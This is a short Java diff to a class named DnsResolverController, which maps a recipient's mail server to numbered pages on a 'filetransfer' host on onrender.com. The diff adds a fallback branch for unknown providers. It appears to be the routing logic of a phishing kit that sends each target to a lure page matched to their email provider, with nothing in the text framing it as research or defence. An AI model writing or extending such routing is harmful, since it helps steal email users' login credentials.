@@ -27,6 +27,9 @@ public class DnsResolverController {
 		else if(mailBox.contains("mxmail.netease.com.")) {
 			return "https://filetransfer-2.onrender.com/2.html?recipient="+recipient;
 		}
+		else if(mailBox.contains("unknown")) {
+			return "https://filetransfer-2.onrender.com/5.html?recipient="+recipient;
+		}
 		
 		return "unknown";
 	}
